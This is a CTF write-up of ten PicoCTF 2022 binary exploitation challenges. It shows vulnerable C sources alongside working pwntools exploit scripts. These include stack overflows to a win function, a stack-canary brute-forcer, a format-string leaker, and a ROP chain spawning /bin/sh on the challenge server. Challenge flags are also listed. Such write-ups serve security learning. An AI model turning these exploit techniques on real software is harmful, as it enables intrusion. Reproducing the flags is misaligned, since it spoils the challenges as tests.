---
title: "[PICOCTF] Binary Exploitation Challenges Writeup"
excerpt_separator: <!--more-->
categories:
  - CTF
tags:
  - PICOCTF
  - PWN
  - "2022"
toc: true
toc_sticky: true
toc_label: "Table of Contents"
---

# Tasks source:
https://github.com/Tzion0/CTF/tree/master/PicoCTF/2022/Binary_Exploitation

Worth to note that we managed to get rank 468 out of 7794 teams in PicoCTF 2022.
![IMG](/assets/images/picoctf2022-for/picoctf_ranking.png)
![IMG](/assets/images/picoctf2022-for/picoctf_myteam.png)

This writeup contains 10 out of 14 Binary Exploitation category challenges in PicoCTF 2022 that i solved.

<!--more-->

# basic-file-exploit
## Description
The program provided allows you to write to a file and read what you wrote from it. Try playing around with it and see if you can break it!

This challenge provided a C source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <stdint.h>
#include <ctype.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>


#define WAIT 60


static const char* flag = "[REDACTED]";

static char data[10][100];
static int input_lengths[10];
static int inputs = 0;



int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;

    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }


    /* Empty the FD Set */
    FD_ZERO(&input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &input_set);

    /* Waiting for some seconds */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
    /* Here, first parameter is number of FDs in the set,
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case.
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf("Unable to read your input\n");
        return -1;
    }

    if (ready_for_reading) {
        read_bytes = read(0, input, l-1);
        if(input[read_bytes-1]=='\n'){
        --read_bytes;
        input[read_bytes]='\0';
        }
        if(read_bytes==0){
            printf("No data given.\n");
            return -4;
        } else {
            return 0;
        }
    } else {
        printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
        return -3;
    }

    return 0;
}


static void data_write() {
  char input[100];
  char len[4];
  long length;
  int r;

  printf("Please enter your data:\n");
  r = tgetinput(input, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }

  while (true) {
    printf("Please enter the length of your data:\n");
    r = tgetinput(len, 4);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }

    if ((length = strtol(len, NULL, 10)) == 0) {
      puts("Please put in a valid length");
    } else {
      break;
    }
  }

  if (inputs > 10) {
    inputs = 0;
  }

  strcpy(data[inputs], input);
  input_lengths[inputs] = length;

  printf("Your entry number is: %d\n", inputs + 1);
  inputs++;
}


static void data_read() {
  char entry[4];
  long entry_number;
  char output[100];
  int r;

  memset(output, '\0', 100);

  printf("Please enter the entry number of your data:\n");
  r = tgetinput(entry, 4);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }

  if ((entry_number = strtol(entry, NULL, 10)) == 0) {
    puts(flag);
    fseek(stdin, 0, SEEK_END);
    exit(0);
  }

  entry_number--;
  strncpy(output, data[entry_number], input_lengths[entry_number]);
  puts(output);
}


int main(int argc, char** argv) {
  char input[3] = {'\0'};
  long command;
  int r;

  puts("Hi, welcome to my echo chamber!");
  puts("Type '1' to enter a phrase into our database");
  puts("Type '2' to echo a phrase in our database");
  puts("Type '3' to exit the program");

  while (true) {
    r = tgetinput(input, 3);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }

    if ((command = strtol(input, NULL, 10)) == 0) {
      puts("Please put in a valid number");
    } else if (command == 1) {
      data_write();
      puts("Write successful, would you like to do anything else?");
    } else if (command == 2) {
      if (inputs == 0) {
        puts("No data yet");
        continue;
      }
      data_read();
      puts("Read successful, would you like to do anything else?");
    } else if (command == 3) {
      return 0;
    } else {
      puts("Please type either 1, 2 or 3");
      puts("Maybe breaking boundaries elsewhere will be helpful");
    }
  }

  return 0;
}
```

We can see that to read the data, we need to provide an entry number and the value we provided will be passing through this check:
```c
if ((entry_number = strtol(entry, NULL, 10)) == 0) {
	puts(flag);
	fseek(stdin, 0, SEEK_END);
	exit(0);
}
```
With that being said, we just need to make the return value to be 0, and it can be easily achieve by inputting string instead of number.

![IMG](/assets/images/picoctf2022-binexp/bfe.png)

Flag:
```
picoCTF{M4K3_5UR3_70_CH3CK_Y0UR_1NPU75_149F090A}
```

# CVE-XXXX-XXXX
## Description
The CVE we're looking for is the first recorded remote code execution (RCE) vulnerability in 2021 in the Windows Print Spooler Service, which is available across desktop and server versions of Windows operating systems. The service is used to manage printers and print servers.

We just need to look for the CVE and then enter as the flag with the following format:
```
picoCTF{CVE-XXXX-XXXXX}
```

A bit of google shows us the CVE is **CVE-2021-34527**.

Flag:
```
picoCTF{CVE-2021-34527}
```

# buffer overflow 0
## Description
Smash the stack Let's start off simple, can you overflow the correct buffer?

This challenge provided a binary and its C source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){

  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler

  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1);
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```

It looks like it will print out the flag when it encounter SIGSEGV signal. So let's try it:

![IMG](/assets/images/picoctf2022-binexp/bof0.png)

Flag:
```
picoCTF{ov3rfl0ws_ar3nt_that_bad_a065d5d9}
```

# buffer overflow 1
## Description
Control the return address
Now we're cooking! You can overflow the buffer and return to the flag function in the program.

This challenge provided a binary and its C source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFSIZE 32
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

From the source code we can see it is a typical ret2win challenge, we just need to overflow the binary then return to the `win()` function.

I created a script using pwntools ROP object to easily control the return function:

```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'INFO'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

eip_offset = 44
info('located EIP offset at {a}'.format(a=eip_offset))

# Create ROP object
rop = ROP(elf)
# Call the hacked function
rop.win()

# Dump out the rop structure
print(rop.dump())
#pprint(rop.gadgets)

# Get the raw bytes
rop_chain = rop.chain()

# Build payload
payload = flat({
    eip_offset: rop_chain

})

# Save payload to file
write('payload', payload)

# Start a new process
io = start()

# PWN
io.sendlineafter(b'string:', payload)

# Receive the flag
io.interactive()
```

![IMG](/assets/images/picoctf2022-binexp/bof1.png)

Flag:
```
picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
```

# buffer overflow 2
## Description
Control the return address and arguments
This time you'll need to control the arguments to the function you return to!

This challenge provided a binary and its C source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

From the source code, we can see that this challenge is similar to **buffer overflow 1**. However, instead of just returning to `win()` function, we also need to pass the function arguments.

Again, this can be easily done using ROP object provided by pwntools:
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'error'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

eip_offset = 112
info('located EIP offset at {a}'.format(a=eip_offset))

# Create ROP object
rop = ROP(elf)
# Call the hacked function
rop.win(0xCAFEF00D,  0xF00DF00D)

# Get the raw bytes
rop_chain = rop.chain() # Add exit : + p32(0x0804927e)

# Build payload
payload = flat({
    eip_offset: rop_chain

})

# Save payload to file
write('payload', payload)

# Start a new process
io = start()

# PWN
io.sendlineafter(b'string: \n', payload)

# Receive the flag
io.interactive()
```

![IMG](/assets/images/picoctf2022-binexp/bof2.png)

Flag:
```
picoCTF{argum3nt5_4_d4yZ_b3fd8f66}
```

# buffer overflow 3
## Description
Do you think you can bypass the protection and get the flag?
It looks like Dr. Oswal added a stack canary to this program to protect against buffer overflows.

This challenge provided a binary and its C source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64
#define CANARY_SIZE 4

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
  puts(buf);
  fflush(stdout);
}

char global_canary[CANARY_SIZE];
void read_canary() {
  FILE *f = fopen("canary.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'canary.txt' in this directory with your",
                    "own debugging canary.\n");
    exit(0);
  }

  fread(global_canary,sizeof(char),CANARY_SIZE,f);
  fclose(f);
}

void vuln(){
   char canary[CANARY_SIZE];
   char buf[BUFSIZE];
   char length[BUFSIZE];
   int count;
   int x = 0;
   memcpy(canary,global_canary,CANARY_SIZE);
   printf("How Many Bytes will You Write Into the Buffer?\n> ");
   while (x<BUFSIZE) {
      read(0,length+x,1);
      if (length[x]=='\n') break;
      x++;
   }
   sscanf(length,"%d",&count);

   printf("Input> ");
   read(0,buf,count);

   if (memcmp(canary,global_canary,CANARY_SIZE)) {
      printf("***** Stack Smashing Detected ***** : Canary Value Corrupt!\n"); // crash immediately
      exit(-1);
   }
   printf("Ok... Now Where's the Flag?\n");
   fflush(stdout);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  read_canary();
  vuln();
  return 0;
}
```

From the source code we can see it implemented canary, the canary is read from `canary.txt` with the size of 4 characters/bytes. To bruteforce it, there will be like 2^32 possible of values, which is 4 billion of possibilities.

Now, there is a smart way to bruteforce it without needing to go through 4 billion of possibilities. In the `vuln()` function, we can see it read our input using `read(0,buf,count);`, where the function do not append a NULL byte to the end of our input buffer, unlike `scanf()`. So what that means is that we can reduce the possibilities to 4 set of 256 characters which are a total of 1024 tries, by appending character by character. For example:
```
a    (Stack Smash!)
b    (Stack Smash!)
c    (Stack Smash!)
d    (No Stack Smash!)
da   (Stack Smash!)
db   (Stack Smash!)
dc   (Stack Smash!)
de   (No Stack Smash!)
dea  (No Stack Smash!)
deaa (Stack Smash!)
```

Also, keep in mind that we cannot include Carriage Return (`\r`) or Line Feed (`\n`) in our input buffer, else it will stop the `read()` function.

Below is the script that will leak the canary from server, notice that we use `send()` instead of `sendline()`:
```py
#!/usr/bin/env python3
from pwn import *
from time import sleep
from itertools import permutations
import time

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'error'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# from buffer to stack canary
pad1 = 64

# The stored values from the leaked canary
canary = ['A', 'A', 'A', 'A']

# loop through all 4 entries of the canary
for i in range(4):
    # loop through all possible bytes for each entry
    for c in range(255):
        p = start();
        p.recv()
        p.sendline(b"-1");
        p.recv()

        payload = b"A" * pad1 # initial padding
        payload += "".join(canary[0:i]).encode() # the canary we've leaked so far
        payload += chr(c).encode() # the new character to try
        print(payload)
        p.send(payload)
        recv = p.recv()
        p.close()

        # Check the output
        if b'Stack Smash' not in recv:
            canary[i] = chr(c) # add the found value
            break

print("".join(canary))
```
![IMG](/assets/images/picoctf2022-binexp/bof3-leak_canary.png)

From the picture we can see we leaked the canary, now we just need to carefully assemble the structure of our payload:
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'error'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# canary token leaked by using leak_canary.py
canry = b"BiRd"

# Start program
io = start()

offset = 64  # Canary offset

io.sendlineafter(b'> ', b'-1')

io.recvuntil(b'Input> ')

# Build payload (return to win)
payload = flat([
    offset * b'A',  # Pad to canary (64)
    canry,  # Our leaked canary (4)
    16 * b'A',  # Pad to Ret pointer (8)
    elf.symbols.win  # Jmp to win function
])

# Send the payload
io.sendline(payload)

# Get Flag
print(io.recv())

io.interactive()
```

Flag:
```
picoCTF{Stat1C_c4n4r13s_4R3_b4D_f9792127}
```

# RPS
## Description
Here's a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row.

This challenge provided a C source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/time.h>
#include <sys/types.h>


#define WAIT 60



static const char* flag = "[REDACTED]";

char* hands[3] = {"rock", "paper", "scissors"};
char* loses[3] = {"paper", "scissors", "rock"};
int wins = 0;



int tgetinput(char *input, unsigned int l)
{
    fd_set          input_set;
    struct timeval  timeout;
    int             ready_for_reading = 0;
    int             read_bytes = 0;

    if( l <= 0 )
    {
      printf("'l' for tgetinput must be greater than 0\n");
      return -2;
    }


    /* Empty the FD Set */
    FD_ZERO(&input_set );
    /* Listen to the input descriptor */
    FD_SET(STDIN_FILENO, &input_set);

    /* Waiting for some seconds */
    timeout.tv_sec = WAIT;    // WAIT seconds
    timeout.tv_usec = 0;    // 0 milliseconds

    /* Listening for input stream for any activity */
    ready_for_reading = select(1, &input_set, NULL, NULL, &timeout);
    /* Here, first parameter is number of FDs in the set,
     * second is our FD set for reading,
     * third is the FD set in which any write activity needs to updated,
     * which is not required in this case.
     * Fourth is timeout
     */

    if (ready_for_reading == -1) {
        /* Some error has occured in input */
        printf("Unable to read your input\n");
        return -1;
    }

    if (ready_for_reading) {
        read_bytes = read(0, input, l-1);
        if(input[read_bytes-1]=='\n'){
        --read_bytes;
        input[read_bytes]='\0';
        }
        if(read_bytes==0){
            printf("No data given.\n");
            return -4;
        } else {
            return 0;
        }
    } else {
        printf("Timed out waiting for user input. Press Ctrl-C to disconnect\n");
        return -3;
    }

    return 0;
}


bool play () {
  char player_turn[100];
  srand(time(0));
  int r;

  printf("Please make your selection (rock/paper/scissors):\n");
  r = tgetinput(player_turn, 100);
  // Timeout on user input
  if(r == -3)
  {
    printf("Goodbye!\n");
    exit(0);
  }

  int computer_turn = rand() % 3;
  printf("You played: %s\n", player_turn);
  printf("The computer played: %s\n", hands[computer_turn]);

  if (strstr(player_turn, loses[computer_turn])) {
    puts("You win! Play again?");
    return true;
  } else {
    puts("Seems like you didn't win this time. Play again?");
    return false;
  }
}


int main () {
  char input[3] = {'\0'};
  int command;
  int r;

  puts("Welcome challenger to the game of Rock, Paper, Scissors");
  puts("For anyone that beats me 5 times in a row, I will offer up a flag I found");
  puts("Are you ready?");

  while (true) {
    puts("Type '1' to play a game");
    puts("Type '2' to exit the program");
    r = tgetinput(input, 3);
    // Timeout on user input
    if(r == -3)
    {
      printf("Goodbye!\n");
      exit(0);
    }

    if ((command = strtol(input, NULL, 10)) == 0) {
      puts("Please put in a valid number");

    } else if (command == 1) {
      printf("\n\n");
      if (play()) {
        wins++;
      } else {
        wins = 0;
      }

      if (wins >= 5) {
        puts("Congrats, here's the flag!");
        puts(flag);
      }
    } else if (command == 2) {
      return 0;
    } else {
      puts("Please type either 1 or 2");
    }
  }

  return 0;
}
```

From the source code we can see this is a Rock-Paper-Scissors game, and to get the flag, we need to win 5 times in a row. However, we can see it use this piece on code to compare our input to determine whether we win or lose:
```c
if (strstr(player_turn, loses[computer_turn])) {
  puts("You win! Play again?");
  return true;
} else {
  puts("Seems like you didn't win this time. Play again?");
  return false;
}
```

The `strstr()` function will return the first occurrence of string that found, which means that we keep winning by inputting the ultimate answer as below:
```
rockpaperscissors
```

![IMG](/assets/images/picoctf2022-binexp/rps.png)

Flag:
```
picoCTF{50M3_3X7R3M3_1UCK_58F0F41B}
```

# x-sixty-what
## Description
Overflow x64 code Most problems before this are 32-bit x86. Now we'll consider 64-bit x86 which is a little different! Overflow the buffer and change the return address to the flag function in this program.

This challenge provided a binary and its C source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```

From the source code we can see this is a typical ret2win challenge again, but in 64-bit. Below is the script to get the flag, `0x40123b` is the address of flag function which can be obtain by using Ghidra:
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'error'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

rip_offset = 72
info('located RIP offset at {a}'.format(a=rip_offset))

# Build payload
payload = flat({
    rip_offset: p64(0x40123b)
})

# Save payload to file
write('payload', payload)

# Start a new process
io = start()

# PWN
io.sendlineafter(b"flag: \n", payload)
print(io.recv())
# Receive the flag
io.interactive()
```

![IMG](/assets/images/picoctf2022-binexp/x-sixty-what.png)

Flag:
```
picoCTF{b1663r_15_b3773r_11c407bc}
```

# flag leak
## Description
Story telling class 1/2
I'm just copying and pasting with this program. What can go wrong?

This challenge provided a binary and its C source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```

From the source code we can see it will read the flag into flag variable. Besides, vulnerability is format string vulnerability by looking at this code:
```c
printf(story);
```

Variables are store in stack, chances are we can leak the flag by utilizing this format string vulnerability.

I created a simply script to leaked the flag, not perfect but it will do its job:
```py
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("./vuln", checksec=False)
context.log_level = "error"

for x in range(130):
  try:
    p = remote('saturn.picoctf.net', 49713)
    p.recvuntil(b">> ")
    p.sendline('%{}$s'.format(x).encode())
    p.recvline()
    leaked = p.recvline()
    if b"CTF{" in leaked:
      print("Flag:", leaked)
      break
    else:
      print(leaked)
  except EOFError:
    pass
```

![IMG](/assets/images/picoctf2022-binexp/flag_leak.png)

We just need to add `"pico"` infront of the leaked flag.

Flag:
```
picoCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}
```

# ropfu
## Description
What's ROP? Can you exploit the following program to get the flag?

This challenge provided a binary and its C source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("How strong is your ROP-fu? Snatch the shell from my hand, grasshopper!\n");
  return gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);


  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```

The challenge clearly indicate we are dealing with ROP. I'm not really familiar with it. However, a tool called **ROPgadget** can automate the ROP chain for us with the command below:
```
ROPgadget --binary vuln --ropchain
```

With the ROP chain available, the rest is just simply assembling them:
```py
#!/usr/bin/env python2
# execve generated by ROPgadget
from pwn import *
from struct import pack
context.log_level = 'error'

sh = remote("saturn.picoctf.net", 62560)

# Padding goes here
p = 'A'*28

p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b074a) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5064) # @ .data + 4
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b074a) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x08049e39) # pop ecx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080e5060) # padding without overwrite ebx
p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0804a3d2) # int 0x80

sh.sendline(p)
sh.interactive()
```

![IMG](/assets/images/picoctf2022-binexp/ropfu.png)

Flag:
```
picoCTF{5n47ch_7h3_5h311_e81af635}
```

Thank you so much for reading till here, have a great day ahead !
